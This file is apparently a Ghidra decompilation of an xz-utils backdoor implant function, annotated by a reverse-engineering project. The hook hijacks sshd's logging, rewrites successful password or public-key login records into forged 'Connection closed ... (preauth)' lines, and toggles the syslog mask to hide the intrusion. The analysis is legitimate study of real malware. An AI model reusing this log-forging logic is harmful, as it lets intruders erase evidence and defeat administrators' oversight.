// /home/kali/xzre-ghidra/xzregh/10A3A0_mm_log_handler_hide_auth_success_hook.c
// Function: mm_log_handler_hide_auth_success_hook @ 0x10A3A0
// Calling convention: __stdcall
// Prototype: void __stdcall mm_log_handler_hide_auth_success_hook(LogLevel level, int forced, char * msg, void * ctx)


/*
 * AutoDoc: Hooks sshd's mm_log_handler so every monitor log line flows through the implant before touching syslog. It refuses
 * requests once logging was already squelched, when the loader flipped `global_ctx->disable_backdoor`, or when setup failed to
 * capture a valid handler/context pair, falling back to sshd's original handler. If a message already contains the literal
 * `"Connection closed by ... (preauth)"` it replays the line via `sshd_log_via_sshlogv(log_ctx_state, level, "%s", msg)` after forcing
 * syslog into mask `SYSLOG_MASK_ALL` so sshd stays quiet. When the text instead begins with `Accepted {password|publickey} for` the hook
 * harvests the username between `for` and `from` plus the host segment leading up to `ssh2`, copies both into scratch buffers,
 * and rebuilds `"Connection closed by ... (preauth)"` with the sanitized format strings cached in `sshd_log_ctx_t`. Both
 * rewrite paths toggle `log_squelched`, temporarily apply the payload's logmask, emit the fake line, and then restore sshd's
 * original mask so future loggers resume normally; missing fragments simply flip `log_squelched` and drop the original entry.
 */

#include "xzre_types.h"

void mm_log_handler_hide_auth_success_hook(LogLevel level,int forced,char *msg,void *ctx)

{
  char *string_cursor;
  BOOL syslog_mask_was_enabled;
  sshd_log_ctx_t *log_ctx_state;
  libc_imports_t *libc_imports;
  EncodedStringId string_id;
  ssize_t msg_len;
  long prefix_copy_idx;
  long scratch_idx;
  ulong fragment_bytes_remaining;
  char *fragment_src;
  uint *word_cursor;
  char *fragment_dst;
  char *host_fragment_start;
  char *user_fragment_start;
  ulong host_fragment_len;
  ulong user_fragment_len;
  u8 zero_seed;
  char rewritten_msg [320];
  sshd_log_ctx_t *log_ctx;
  log_handler_fn sshlog_impl;
  u64 filtered_host_chunk0;
  u64 filtered_host_chunk1;
  uint filtered_host_words[60];
  u64 user_fragment_chunk0;
  u64 user_fragment_chunk1;
  uint user_fragment_words[60];
  u64 prefix_chunk0;
  u64 prefix_chunk1;
  uint prefix_word;
  char authenticating_label[14];
  uchar label_space;
  char user_label[4];
  uchar user_space;
  char percent_s_head0;
  char percent_s_head1;
  uchar percent_s_padding;
  char percent_s_tail0;
  char percent_s_tail1;
  ushort open_bracket_padding;
  char preauth_label[7];
  uchar closing_bracket_char;
  
  zero_seed = 0;
  log_ctx_state = *(sshd_log_ctx_t **)(global_ctx + 0x30);
  libc_imports = *(long *)(global_ctx + 0x10);
  filtered_host_chunk0 = 0;
  filtered_host_chunk1 = 0;
  word_cursor = filtered_host_words;
  for (scratch_idx = 0x3c; scratch_idx != 0; scratch_idx = scratch_idx + -1) {
    *word_cursor = 0;
    word_cursor = word_cursor + 1;
  }
  user_fragment_chunk0 = 0;
  user_fragment_chunk1 = 0;
  word_cursor = user_fragment_words;
  for (scratch_idx = 0x3c; scratch_idx != 0; scratch_idx = scratch_idx + -1) {
    *word_cursor = 0;
    word_cursor = word_cursor + 1;
  }
  prefix_chunk0 = 0;
  prefix_chunk1 = 0;
  word_cursor = &prefix_word;
  for (scratch_idx = 0x7c; scratch_idx != 0; scratch_idx = scratch_idx + -1) {
    *word_cursor = 0;
    word_cursor = word_cursor + 1;
  }
  if (msg != (char *)0x0) {
    // AutoDoc: Respect the `log_squelched` gate: each log request is rewritten at most once before the hook bails out.
    if (log_ctx_state->log_squelched == TRUE) {
      return;
    }
    // AutoDoc: Stop filtering altogether once the loader flagged logging as disabled (for example after sshd drops back to the sandbox).
    if (*(int *)(global_ctx + 0x90) != 0) {
      return;
    }
    // AutoDoc: Treat a saved handler without a saved context value as an incomplete log-hook install and bail out immediately.
    if ((log_ctx_state->saved_log_handler != (log_handler_fn)0x0) &&
       (log_ctx_state->saved_log_handler_ctx == (void *)0x0)) {
      return;
    }
    msg_len = strlen_unbounded(msg);
    string_cursor = msg + msg_len;
    while( TRUE ) {
      if (string_cursor <= msg) {
        return;
      }
      string_id = encoded_string_id_lookup(msg,string_cursor);
      // AutoDoc: Slide across the message until the canned "Connection closed by" literal appears; those lines trigger the fast pass-through path.
      if (string_id == STR_Connection_closed_by) break;
      // AutoDoc: Successful authentication lines enter the rewrite path so we can harvest their username/host fragments.
      if ((string_id == STR_Accepted_password_for) || (string_id == STR_Accepted_publickey_for)) {
        user_fragment_start = msg + 0x17;
        if (string_id == STR_Accepted_password_for) {
          user_fragment_start = msg + 0x16;
        }
        host_fragment_len = 0;
        host_fragment_start = (char *)0x0;
        user_fragment_len = 0;
        goto LAB_0010a504;
      }
      msg = msg + 1;
    }
    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(u16 *)log_ctx_state->fmt_percent_s);
    log_ctx_state->log_squelched = TRUE;
    // AutoDoc: Temporarily force `setlogmask(SYSLOG_MASK_ALL)` whenever syslog suppression is enabled so sshd's own handler stays quiet while we inject a sanitized line.
    if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
       (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
      (**(code **)(libc_imports + 0x58))(SYSLOG_MASK_ALL);
    }
    // AutoDoc: Replay already sanitised "Connection closed" lines through `sshd_log_via_sshlogv(log_ctx_state, level, "%s", msg)` so syslog stays muted.
    sshd_log_via_sshlogv(log_ctx_state,level,(char *)&prefix_chunk0,msg);
    syslog_mask_was_enabled = log_ctx_state->syslog_mask_applied;
    goto joined_r0x0010a4c2;
  }
  goto LAB_0010a6da;
LAB_0010a504:
  do {
    string_id = encoded_string_id_lookup(msg,string_cursor);
    // AutoDoc: The trailing " ssh2" token marks the end of the host fragment; copy it into the scratch buffer once seen.
    if (string_id == STR_ssh2) {
      if (host_fragment_start != (char *)0x0) {
        host_fragment_len = (long)msg - (long)host_fragment_start;
        fragment_bytes_remaining = host_fragment_len;
        fragment_src = host_fragment_start;
        fragment_dst = (char *)&filtered_host_chunk0;
        if (0xff < host_fragment_len) goto LAB_0010a6da;
        for (; fragment_bytes_remaining != 0; fragment_bytes_remaining = fragment_bytes_remaining - 1) {
          *fragment_dst = *fragment_src;
          fragment_src = fragment_src + (ulong)zero_seed * -2 + 1;
          fragment_dst = fragment_dst + (ulong)zero_seed * -2 + 1;
        }
      }
    }
    // AutoDoc: The " from " delimiter finalises the username fragment and records the start of the host string.
    else if (string_id == STR_from) {
      user_fragment_len = (long)msg - (long)user_fragment_start;
      if (0xff < user_fragment_len) goto LAB_0010a6da;
      host_fragment_start = msg + 6;
      fragment_src = user_fragment_start;
      fragment_dst = (char *)&user_fragment_chunk0;
      for (fragment_bytes_remaining = user_fragment_len; fragment_bytes_remaining != 0; fragment_bytes_remaining = fragment_bytes_remaining - 1) {
        *fragment_dst = *fragment_src;
        fragment_src = fragment_src + (ulong)zero_seed * -2 + 1;
        fragment_dst = fragment_dst + (ulong)zero_seed * -2 + 1;
      }
    }
    msg = msg + 1;
  } while (msg < string_cursor);
  // AutoDoc: Only rebuild the "Connection closed by ... (preauth)" string after both fragments were captured and bounded.
  if ((user_fragment_len != 0) && (host_fragment_len != 0)) {
    string_cursor = log_ctx_state->str_connection_closed_by;
    scratch_idx = 0;
    do {
      prefix_copy_idx = scratch_idx + 1;
      *(char *)((long)&prefix_chunk0 + scratch_idx) = string_cursor[scratch_idx];
      scratch_idx = prefix_copy_idx;
    } while (prefix_copy_idx != 0x15);
    string_cursor = log_ctx_state->str_authenticating;
    scratch_idx = 0;
    do {
      authenticating_label[scratch_idx] = string_cursor[scratch_idx];
      scratch_idx = scratch_idx + 1;
    } while (scratch_idx != 0xe);
    label_space = 0x20;
    string_cursor = log_ctx_state->str_user;
    scratch_idx = 0;
    do {
      user_label[scratch_idx] = string_cursor[scratch_idx];
      scratch_idx = scratch_idx + 1;
    } while (scratch_idx != 4);
    user_space = 0x20;
    percent_s_head0 = *log_ctx_state->fmt_percent_s;
    percent_s_head1 = log_ctx_state->fmt_percent_s[1];
    percent_s_padding = 0x20;
    percent_s_tail0 = *log_ctx_state->fmt_percent_s;
    percent_s_tail1 = log_ctx_state->fmt_percent_s[1];
    open_bracket_padding = 0x5b20;
    string_cursor = log_ctx_state->str_preauth;
    scratch_idx = 0;
    do {
      preauth_label[scratch_idx] = string_cursor[scratch_idx];
      scratch_idx = scratch_idx + 1;
    } while (scratch_idx != 7);
    closing_bracket_char = 0x5d;
    log_ctx_state->log_squelched = TRUE;
    if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
       (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
      (**(code **)(libc_imports + 0x58))(SYSLOG_MASK_ALL);
    }
    // AutoDoc: Emit the forged disconnect message with the cached user/host fragments so sshd sees only the redacted string.
    sshd_log_via_sshlogv(log_ctx_state,SYSLOG_LEVEL_INFO,(char *)&prefix_chunk0,&user_fragment_chunk0,&filtered_host_chunk0);
    syslog_mask_was_enabled = log_ctx_state->syslog_mask_applied;
joined_r0x0010a4c2:
    if (syslog_mask_was_enabled == FALSE) {
      return;
    }
    if (libc_imports == 0) {
      return;
    }
    if (*(code **)(libc_imports + 0x58) == (code *)0x0) {
      return;
    }
    // AutoDoc: Restore sshd's original syslog mask after the sanitized message has been emitted.
    (**(code **)(libc_imports + 0x58))(SYSLOG_MASK_SILENCE);
    return;
  }
LAB_0010a6da:
  log_ctx_state->log_squelched = TRUE;
  return;
}

